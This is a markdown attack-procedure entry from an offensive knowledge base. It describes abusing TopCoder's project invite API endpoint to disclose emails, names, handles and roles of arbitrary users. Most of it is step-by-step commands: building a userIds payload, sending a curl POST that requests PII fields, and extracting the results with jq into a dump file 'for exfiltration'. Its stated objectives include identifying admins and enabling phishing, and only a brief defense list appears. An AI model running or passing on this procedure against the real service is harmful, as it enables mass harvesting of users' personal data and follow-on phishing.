---
tags:
  - pii-disclosure
  - information-leak
  - api-exploit
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/topcoder-project-invite-disclose]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:17.364Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 2ba8a6c5-2bc1-42ff-bd5a-d8ce2c2bfded
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# Disclose-PII-via-Project-Invite-Endpoint

## Summary

This procedure chains with user enumeration to exploit the TopCoder /v5/projects/{id}/members/invite/ endpoint, disclosing full PII such as emails, names, handles, and roles for arbitrary user IDs by sending manipulated invite requests without permission checks.

## Description

The invite endpoint returns comprehensive user details in responses, including sensitive PII, even for users not owned by the inviter. By providing an array of userIds obtained from search enumeration and specifying a role, attackers can query any users, including admins. This lacks data filtering, enabling mass PII harvesting. Requires project ID from prior access and valid session.

## Requirements

1. Project ID (e.g., 13482) from TopCoder project access
2. List of user IDs from enumeration procedure
3. Authenticated session token
4. Proxy tool for request modification

## Defense

Defensive measures and detection strategies:

- Enforce inviter permissions; only allow invites for verified users
- Filter response data to exclude PII unless explicitly authorized
- Log and alert on bulk invite attempts with large userId arrays
- Implement input validation on userId arrays to prevent abuse

## Objectives

1. Retrieve full emails and profile details for targeted users
2. Identify admin roles and internal accounts
3. Facilitate further attacks like phishing with real data

## Instructions

### Step 1: Prepare Invite Request Body

**Context**: Collect userIds and format the JSON payload.

**Command** ([[commands/topcoder-project-invite-disclose]]):

Create the body with userIds array.

```bash
# Example payload preparation
echo '{"userIds":[41008482, 41008483, 41008486, 41012377],"role":"customer"}' > invite.json
```

> Prepares JSON for POST body.

### Step 2: Send Manipulated Invite Request

**Context**: Execute the POST to trigger PII disclosure.

**Command** ([[commands/topcoder-project-invite-disclose]]):

Send to the endpoint with fields parameter.

```bash
curl -X POST "https://api.topcoder.com/v5/projects/13482/members/invite/?fields=id,projectId,userId,email,role,status,createdAt,updatedAt,createdBy,updatedBy,handle,firstName,lastName,photoURL" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d @invite.json
```

> Returns JSON with full PII; emails now complete.

### Step 3: Extract and Analyze PII

**Context**: Parse response for sensitive data.

**Command**:

Filter emails and names.

```bash
curl ... | jq '.[].email, .[].firstName, .[].lastName' > pii_dump.txt
```

> Output: Extracted PII for exfiltration.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/topcoder-project-invite-disclose]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- pii-disclosure
- information-leak
- api-exploit
